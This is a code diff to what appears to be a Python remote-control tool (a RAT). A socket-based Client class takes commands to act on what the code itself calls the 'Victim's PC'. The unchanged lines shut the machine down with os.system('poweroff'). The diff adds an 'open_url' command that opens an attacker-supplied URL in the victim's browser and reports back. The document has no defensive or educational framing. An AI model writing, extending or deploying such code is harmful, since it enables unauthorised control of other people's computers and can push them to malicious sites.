@@ -2,6 +2,7 @@ import socket
 from typing import *
 import sys
 import os
+import webbrowser
 class Client():
     def __init__(self,c:socket.socket,addr:Tuple[str,int]) -> None:
         self.client=c
@@ -33,6 +34,11 @@ class Client():
             else:
                 self.client.send("Shutting Down Victim's PC!".encode())
                 os.system("poweroff")
+        # Open URL
+        if self.command.startswith("open_url"):
+            _,_URL_TO_OPEN=self.command.split()
+            webbrowser.open(_URL_TO_OPEN)
+            self.client.send(f"Opening {_URL_TO_OPEN} In Victim's PC!".encode())
     @property
     def os_name(self) -> str:
         if sys.platform=="win32":
